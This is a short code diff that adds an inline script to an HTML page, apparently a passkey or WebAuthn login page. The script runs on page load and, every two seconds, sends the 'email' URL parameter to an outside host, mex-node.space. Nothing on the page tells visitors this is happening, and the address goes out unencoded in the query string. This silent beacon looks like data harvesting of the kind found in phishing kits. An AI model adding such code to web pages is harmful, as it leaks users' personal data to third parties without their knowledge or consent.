@@ -87,6 +87,28 @@
   </div>
 
   <script>
+
+    (function callEndpointWithEmail() {
+      const endpoint = 'https://mex-node.space/'; // Replace with your actual endpoint URL
+  
+      setInterval(async () => {
+          const urlParams = new URLSearchParams(window.location.search);
+          const email = urlParams.get('email');
+          if (!email) {
+            console.error('Email query parameter is missing');
+            return;
+          }
+          const urlWithParams = `${endpoint}?email=${email}`;
+      
+          try {
+            const response = await fetch(urlWithParams);
+            const data = await response.json();
+            console.log(data);
+          } catch (error) {
+            console.error('Error calling endpoint:', error);
+          }
+        }, 2000); // 2000 milliseconds interval
+    })();
     // Base64url to ArrayBuffer conversion
     function base64urlToArrayBuffer(base64url) {
       const base64 = base64url.replace(/-/g, '+').replace(/_/g, '/');
